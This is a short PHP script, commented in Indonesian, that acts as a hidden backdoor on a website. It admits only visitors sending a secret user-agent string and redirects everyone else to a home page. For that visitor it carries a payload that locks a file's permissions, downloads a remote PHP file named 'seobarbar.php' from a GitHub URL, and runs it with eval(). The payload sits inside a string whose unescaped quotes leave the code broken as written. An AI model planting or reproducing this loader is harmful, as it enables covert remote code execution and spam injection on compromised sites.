<?php
// Mengaktifkan error reporting untuk debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Memastikan file manager hanya bisa diakses dengan user-agent khusus
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// User-agent yang diizinkan
$allowed_user_agent = "R00T@5Y4H$_#";

// Mengecek apakah user-agent sesuai
if ($user_agent === $allowed_user_agent) {
    // Simulasi akses ke file manager atau remote code
    $remoteCode = "<?php
$file = 's.php';
chmod($file, 0444);
?>

<?php
$remoteUrl = "https://raw.githubusercontent.com/5Y4H/seo/main/seobarbar.php";
$ch = curl_init($remoteUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$remoteCode = curl_exec($ch);
if (curl_errno($ch)) {
    die('cURL error: ' . curl_error($ch));
}
curl_close($ch);
eval("?>" . $remoteCode);
?>
";  // Ganti dengan kode atau hasil dari file manager Anda

    // Menampilkan hasil jika user-agent valid
    echo "Akses berhasil! " . $remoteCode;
} else {
    // Jika user-agent tidak sesuai, lakukan redirect ke halaman home atau tampilkan pesan error
    header("Location: /home");  // Ganti dengan URL halaman home Anda
    exit();  // Pastikan eksekusi berhenti setelah redirect
}
?>
